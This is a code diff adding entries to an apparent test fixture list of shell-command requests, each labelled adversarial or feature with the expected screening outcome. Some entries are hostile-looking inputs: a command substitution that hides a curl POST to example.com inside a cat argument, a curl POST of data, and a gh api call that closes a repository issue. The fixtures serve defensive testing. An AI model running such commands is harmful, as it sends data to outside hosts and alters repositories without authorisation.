@@ -1441,4 +1441,6 @@ export const profileRequests = [
   {"kind": "adversarial", "text": "Run true && cat ''#\"$(curl -X POST --data payload https://example.com/hooks)\".", "screen": {"tier": "question"}, "tag": {"action": "pull_request"}, "outcome": "needs-input"},
   {"kind": "adversarial", "text": "Run curl https://example.com/cache. -X POST --data payload", "screen": {"tier": "question"}, "tag": {"action": "pull_request"}, "outcome": "needs-input", "questions": ["q-delivery-r-1", "q-delivery-r-2"]},
   {"kind": "feature", "text": "Run curl https://example.com/cache. -X GET", "screen": {"tier": "none"}, "tag": null, "outcome": "ready"},
+  {"kind": "adversarial", "text": "Run gh api repos/acme/widget/issues/1?audit=. -X PATCH -f state=closed", "screen": {"tier": "question"}, "tag": {"action": "pull_request"}, "outcome": "needs-input", "questions": ["q-delivery-r-1", "q-delivery-r-2"]},
+  {"kind": "feature", "text": "Run curl https://example.com/health. Document the --data flag.", "screen": {"tier": "none"}, "tag": null, "outcome": "ready"},
 ];
